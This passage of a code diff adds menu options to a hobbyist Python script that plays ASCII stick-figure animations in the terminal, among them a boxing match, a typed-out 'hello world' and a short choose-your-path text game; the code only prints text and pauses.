+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+          time.sleep(0.1)
+          print("01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101")
+          time.sleep(0.1)
+          print("89898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989898989")
+
+        elif choice == '16':
+          time.sleep(0.2)
+          print("""
+          
+             0             .
+            /|\            .
+            / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+               0           .
+              \|/          .
+              / \          .  
+                  
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+            0             .
+           /|\            .
+           / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+         0             .
+        \|/            .
+        / \            .
+             
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+             0             .
+            /|\            .
+            / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+               0           .
+              \|/          .
+              / \          .  
+                  
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+            0             .
+           /|\            .
+           / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+         0             .
+        \|/            .
+        / \            .
+             
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+             0             .
+            /|\            .
+            / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+               0           .
+              \|/          .
+              / \          .  
+                  
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+            0             .
+           /|\            .
+           / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+         0             .
+        \|/            .
+        / \            .
+             
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+             0             .
+            /|\            .
+            / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+               0           .
+              \|/          .
+              / \          .  
+                  
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+            0             .
+           /|\            .
+           / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+         0             .
+        \|/            .
+        / \            .
+             
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+             0             .
+            /|\            .
+            / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+               0           .
+              \|/          .
+              / \          .  
+                  
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+            0             .
+           /|\            .
+           / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+         0             .
+        \|/            .
+        / \            .
+             
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+             0             .
+            /|\            .
+            / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+               0           .
+              \|/          .
+              / \          .  
+                  
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+            0             .
+           /|\            .
+           / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+         0             .
+        \|/            .
+        / \            .
+             
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+             0             .
+            /|\            .
+            / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+               0           .
+              \|/          .
+              / \          .  
+                  
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+            0             .
+           /|\            .
+           / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+         0             .
+        \|/            .
+        / \            .
+             
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+             0             .
+            /|\            .
+            / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+               0           .
+              \|/          .
+              / \          .  
+                  
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+            0             .
+           /|\            .
+           / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+         0             .
+        \|/            .
+        / \            .
+             
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+             0             .
+            /|\            .
+            / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+               0           .
+              \|/          .
+              / \          .  
+                  
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+            0             .
+           /|\            .
+           / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+         0             .
+        \|/            .
+        / \            .
+             
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+             0             .
+            /|\            .
+            / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+               0           .
+              \|/          .
+              / \          .  
+                  
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+            0             .
+           /|\            .
+           / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+         0             .
+        \|/            .
+        / \            .
+             
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+             0             .
+            /|\            .
+            / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+               0           .
+              \|/          .
+              / \          .  
+                  
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+            0             .
+           /|\            .
+           / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+         0             .
+        \|/            .
+        / \            .
+             
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+             0             .
+            /|\            .
+            / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+               0           .
+              \|/          .
+              / \          .  
+                  
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+            0             .
+           /|\            .
+           / \            .
+                        """)
+          time.sleep(0.2)
+          print("""
+          
+         0             .
+        \|/            .
+        / \            .
+             
+                        """)
+
+        elif choice == '17':
+          time.sleep(0.5)
+          print("""
+          
+          
+           0
+          /|\          0              000
+          /|           |            000000           00000
+          --------------------------------------------------------------
+                                                                          """)
+          time.sleep(0.5)
+          print("""
+          
+          
+            0
+           /|\          0              000
+            |\          |            000000           00000
+          --------------------------------------------------------------
+                                                                          """)
+          time.sleep(0.5)
+          print("""
+          
+          
+             0
+            /|\         0              000
+            /|          |            000000           00000
+          --------------------------------------------------------------
+                                                                          """)
+          time.sleep(0.5)
+          print("""
+          
+          
+               0
+              /|\       0              000
+               |\       |            000000           00000
+          --------------------------------------------------------------
+                                                                          """)
+
+          time.sleep(0.5)
+          print("""
+          
+          
+                 0
+                /|\     0              000
+                /|      |            000000           00000
+          --------------------------------------------------------------
+                                                                          """)
+          time.sleep(0.5)
+          print("""
+                    0          
+                   /|\          
+                   / \
+                        0              000
+                        |            000000           00000
+          --------------------------------------------------------------
+                                                                          """)
+          time.sleep(0.5)
+          print("""
+                          0          
+                         /|\          
+                         / \
+                        0              000
+                        |            000000           00000
+          --------------------------------------------------------------
+                                                                          """)
+          time.sleep(0.5)
+          print("""
+                                    
+                                   
+                              0                        
+                        0    /|\       000
+                        |    /|      000000           00000
+          --------------------------------------------------------------
+                                                                          """)
+          time.sleep(0.5)
+          print("""
+                                    
+                                   
+                                 0                        
+                        0       /|\    000
+                        |        |\   000000           00000
+          --------------------------------------------------------------
+                                                                          """)
+          time.sleep(0.5)
+          print("""
+                                    0
+                                   /|\
+                                   / \                       
+                        0              000
+                        |             000000           00000
+          --------------------------------------------------------------
+                                                                          """)
+          time.sleep(0.5)
+          print("""
+                                             0
+                                            /|\
+                                            / \                       
+                        0              000
+                        |             000000           00000
+          --------------------------------------------------------------
+                                                                          """)
+          time.sleep(0.5)
+          print("""
+                                             
+                                            
+                                                  0               
+                        0              000       /|\
+                        |             000000     /|    00000
+          --------------------------------------------------------------
+                                                                          """)
+          time.sleep(0.5)
+          print("""
+                                             
+                                                      0                 |                          
+                                                     /|\                |
+                        0              000           / \                |
+                        |             000000           00000            |
+          --------------------------------------------------------------
+                                                                          """)    
+          time.sleep(0.5)
+          print("""
+                                             
+                                                             0          |                                 
+                                                            /|\         |  
+                        0              000                  / \         |
+                        |             000000           00000            |
+          --------------------------------------------------------------
+                                                                          """)         
+          time.sleep(0.5)
+          print("""
+                                             
+                                                                                                       
+                                                                0       |
+                        0              000                     /|\      |
+                        |             000000           00000   /|       |
+          --------------------------------------------------------------
+                                                                          """)     
+          time.sleep(0.5)
+          print("""
+                                             
+                                                                                                       
+                                                                    0   |   
+                        0              000                         /|\  |
+                        |             000000           00000        |\  |
+          --------------------------------------------------------------
+                                                                          """) 
+          time.sleep(0.5)
+          print("""
+                                             
+                                                                                                       
+                                                                        | 
+                        0              000                              |
+                        |             000000           00000            |
+          --------------------------------------------------------------
+                                                                          """) 
+
+                                
+        elif choice == '18':
+          time.sleep(1.0)
+          print("BOXING!")
+          time.sleep(1.0)
+          print("3!")
+          time.sleep(1.0)
+          print("2!")
+          time.sleep(1.0)
+          print("1!")
+          time.sleep(0.7)
+          print("""
+                   BOXING RING!!!!!!!!!
+          
+          
+          
+                0                   0                 :
+               /|-                 -|\                :
+               / \                 / \                :
+           ---------------------------------------------""")
+          time.sleep(0.7)
+          print("""
+                   BOXING RING!!!!!!!!!
+          
+          
+          
+                    0      0                          :
+                   /|-    -|\                         :
+                   / \    / \                         :
+           ---------------------------------------------""")
+          time.sleep(0.7)
+          print("""
+                   BOXING RING!!!!!!!!!
+          
+          
+          
+                    0      0                           :
+                   /|-    -|\                          :
+                   / \    / \                          :
+           ---------------------------------------------""")
+          time.sleep(0.7)
+          print("""
+                   BOXING RING!!!!!!!!!
+          
+          
+          
+                       0 /0                             :
+                      /| -|\                            :
+                      / \ / \                           :
+           ---------------------------------------------""")
+          time.sleep(0.7)
+          print("""
+                   BOXING RING!!!!!!!!!
+          
+          
+          
+                       0                                :
+                      /|\         = 0                   :
+                      / \       /|                      :
+           ---------------------------------------------""")
+          time.sleep(0.7)
+          print("""
+                   KNOCK OUT!!!!!!!!!
+          
+          
+          
+                       0                               :
+                      /|\        \\                    :
+                      / \       ]==o                   :
+           ---------------------------------------------""")
+          time.sleep(0.7)  
+          print("""
+                   BOXING RING!!!!!!!!!
+          
+          
+          
+                0                   0                 :
+               /|-                 -|\                :
+               / \                 / \                :
+           ---------------------------------------------""")
+          time.sleep(0.7)
+          print("""
+                   BOXING RING!!!!!!!!!
+          
+          
+          
+                    0      0                          :
+                   /|-    -|\                         :
+                   / \    / \                         :
+           ---------------------------------------------""")
+          time.sleep(0.7)
+          print("""
+                   BOXING RING!!!!!!!!!
+          
+          
+          
+                    0      0                           :
+                   /|-    -|\                          :
+                   / \    / \                          :
+           ---------------------------------------------""")
+          time.sleep(0.7)
+          print("""
+                   BOXING RING!!!!!!!!!
+          
+          
+          
+                       0 /0                             :
+                      /| -|\                            :
+                      / \ / \                           :
+           ---------------------------------------------""")
+          time.sleep(0.7)
+          print("""
+                   BOXING RING!!!!!!!!!
+          
+          
+          
+                       0                                :
+                      /|\         = 0                   :
+                      / \       /|                      :
+           ---------------------------------------------""")
+          time.sleep(0.7)
+          print("""
+                   KNOCK OUT!!!!!!!!!
+          
+          
+          
+                       0                               :
+                      /|\        \\                    :
+                      / \       ]==o                   :
+           ---------------------------------------------""")
+
+        elif choice == '19':
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          p""")
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          pr""")
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          pri""")
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          prin""")
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          print""")
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          print(""")
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          print(" """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          print("h """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          print("he """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          print("hel """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          print("hell """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          print("hello """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          print("hello w """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          print("hello wo """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          print("hello wor """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          print("hello worl """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          print("hello world """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          print("hello world" """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          print("hello world") """)
+          time.sleep(0.7)
+
+        elif choice == '20':
+          choice2 = input("""
+          
+  your alone do u wanna go outside or sit inside and code? 1 = outside 2 = code        
+          
+           0                                             .
+          /|\                                            /
+          / \                                            .
+                        ?????: """)
+          if choice2 == '1':
+              choice3 = input("""
+          you see a man following u what do you do? 1 = run 2 = walk
+                                   0000
+                                  0000000          
+                                  00000000
+  0           0                    |||00
+ /|\         /|\                   |||
+ / \         / \                   |||
+                           ???:""")
+          if choice3 == '1':
+             print("""
+                    you trip and die game over...
+                                   0000
+                                  0000000          
+                                  00000000
+                0                   |||00
+               /|\  \                |||
+               / \   -====o          |||
+                           ???:""")     
+
+          elif choice3 == '2':
+             print("""
+                    he catches up to you and stabs you game over......
+                                   0000
+                                  0000000          
+                                  00000000
+                0                   |||00
+               /|\  \                |||
+               / \   -====o          |||
+                           ???:""")                  
+          elif choice2 == '2':
+           print("""
+          
+          
+           0        you enjoy ur day being a fat chud       .
+          /|\  _/                                    /
+          / \ |-|                                    .
+                             """)
+           time.sleep(0.7)
+
+        elif choice == '21':
+          time.sleep(0.2)
+          print("""
+          
+         0 
+        0  
+       0   
+      0    
+     0     
+      0    
+         
+          
+          
+          
+                             """)
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       0   
+      0    
+     0     
+      0    
+       0  
+        0  
+          
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       
+          
+     0     
+      0    
+       0  
+        0 0 
+         0 
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       
+          
+         
+            0
+       0   0
+        0 0 
+         0 
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       
+          0
+           0
+            0
+           0
+          0 
+         0 
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+        0  
+         0      
+          0
+           0
+            0
+           0
+         
+         
+          
+                             """)
+          time.sleep(0.2)
+          print("""
+          
+         0 
+        0  
+       0   
+      0    
+     0     
+      0    
+         
+          
+          
+          
+                             """)
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       0   
+      0    
+     0     
+      0    
+       0  
+        0  
+          
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       
+          
+     0     
+      0    
+       0  
+        0 0 
+         0 
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       
+          
+         
+            0
+       0   0
+        0 0 
+         0 
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       
+          0
+           0
+            0
+           0
+          0 
+         0 
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+        0  
+         0      
+          0
+           0
+            0
+           0
+         
+         
+          
+                             """)
+          time.sleep(0.2)
+          print("""
+          
+         0 
+        0  
+       0   
+      0    
+     0     
+      0    
+         
+          
+          
+          
+                             """)
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       0   
+      0    
+     0     
+      0    
+       0  
+        0  
+          
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       
+          
+     0     
+      0    
+       0  
+        0 0 
+         0 
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       
+          
+         
+            0
+       0   0
+        0 0 
+         0 
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       
+          0
+           0
+            0
+           0
+          0 
+         0 
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+        0  
+         0      
+          0
+           0
+            0
+           0
+         
+         
+          
+                             """)
+          time.sleep(0.2)
+          print("""
+          
+         0 
+        0  
+       0   
+      0    
+     0     
+      0    
+         
+          
+          
+          
+                             """)
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       0   
+      0    
+     0     
+      0    
+       0  
+        0  
+          
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       
+          
+     0     
+      0    
+       0  
+        0 0 
+         0 
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       
+          
+         
+            0
+       0   0
+        0 0 
+         0 
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       
+          0
+           0
+            0
+           0
+          0 
+         0 
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+        0  
+         0      
+          0
+           0
+            0
+           0
+         
+         
+          
+                             """)
+          time.sleep(0.2)
+          print("""
+          
+         0 
+        0  
+       0   
+      0    
+     0     
+      0    
+         
+          
+          
+          
+                             """)
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       0   
+      0    
+     0     
+      0    
+       0  
+        0  
+          
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       
+          
+     0     
+      0    
+       0  
+        0 0 
+         0 
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       
+          
+         
+            0
+       0   0
+        0 0 
+         0 
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+          
+       
+          0
+           0
+            0
+           0
+          0 
+         0 
+          
+                             """)
+
+          time.sleep(0.2)
+          print("""
+          
+         
+        0  
+         0      
+          0
+           0
+            0
+           0
+         
+         
+          
+                             """)
+        elif choice == '22':
+          time.sleep(0.7)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+            0     _/
+           /|\   -----
+           / \   |   |
+                                   """)
+          time.sleep(0.7)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+            0/   _/
+           /|    -----
+           / \   |   |
+                                   """)
+          time.sleep(0.7)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+             0/  _/
+            /|   -----
+            / \  |   |
+                                   """)
+          time.sleep(0.7)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+             0 
+            /|\     --
+            / \ _/|   |
+                                   """)
+          time.sleep(0.7)
+
+        elif choice == '23':
+          time.sleep(0.7)
+          print("""
+          
+          
+          
+          
+          
+           0                                           0
+          /|\                                       --/|\ 
+         */ \                                         / \
+                            """)
+          time.sleep(0.7)
+          print("""
+          
+          
+          
+          
+          
+           0/*                                         0
+          /|                                        --/|\ 
+          / \                                         / \
+                            """)
+          time.sleep(0.7)
+          print("""
+          
+          
+          
+          
+                   *          
+           0                                           0              |
+          /|\                                       --/|\             |
+          / \                                         / \             |
+                            """)
+          time.sleep(0.7)
+          print("""
+          
+          
+          
+          
+                                             
+           0                       *                   0               |
+          /|\                                       --/|\              |
+          / \                                         / \              |
+                            """)
+          time.sleep(0.7)
+          print("""
+          
+          
+          
+          
+                                             
+           0                                     *    -\0              |
+          /|\                                          |\              |
+          / \                                         / \              |
+                            """)
+          time.sleep(0.7)
+          print("""
+          
+          
+          
+          
+                                             *
+           0                                           0
+          /|\                                       --/|\ 
+          / \                                         / \
+                            """)
+          time.sleep(0.7)
+          print("""
+          
+          
+          
+                                      *
+                                             
+           0                                           0
+          /|\                                       --/|\ 
+          / \                                         / \
+                            """)
+          time.sleep(0.7)
+          print("""
+          
+          
+          
+              *
+                                             
+           0                                           0
+          /|\                                       --/|\ 
+          / \                                         / \
+                            """)
+          time.sleep(0.7)
+          print("""
+          
+          
+   *       
+              
+                                             
+           0                                           0
+          /|\                                       --/|\ 
+          / \                                         / \
+                            """)
+          time.sleep(0.7)
+
+        elif choice =='24':
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          -------------------
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+                         |
+                         |
+          ---------------|
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+                         |
+                         |
+                         |
+                         |          
+                         |
+                         |
+                  -------|
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+                ---------|
+                         |
+                         |
+                         |          
+                         |
+                         |
+                         |
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          ----------------
+                         
+                         
+                                   
+                         
+                         
+
+                         
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          ------
+          |               
+          |               
+          |                         
+          |               
+          |               
+          |
+                         
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+                         
+                         
+                                   
+                          
+                          
+           ----------------
+                         
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          -------------------
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+                         |
+                         |
+          ---------------|
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+                         |
+                         |
+                         |
+                         |          
+                         |
+                         |
+                  -------|
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+                ---------|
+                         |
+                         |
+                         |          
+                         |
+                         |
+                         |
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          ----------------
+                         
+                         
+                                   
+                         
+                         
+
+                         
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          ------
+          |               
+          |               
+          |                         
+          |               
+          |               
+          |
+                         
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+                         
+                         
+                                   
+                          
+                          
+           ----------------
+                         
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+          
+          
+          -------------------
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          
+          
+          
+                         |
+                         |
+          ---------------|
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+                         |
+                         |
+                         |
+                         |          
+                         |
+                         |
+                  -------|
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+                ---------|
+                         |
+                         |
+                         |          
+                         |
+                         |
+                         |
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          ----------------
+                         
+                         
+                                   
+                         
+                         
+
+                         
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
+          ------
+          |               
+          |               
+          |                         
+          |               
+          |               
+          |
+                         
+          
+          
+                                       """)
+          time.sleep(0.2)
+          print("""
+          
+          
+          
+          
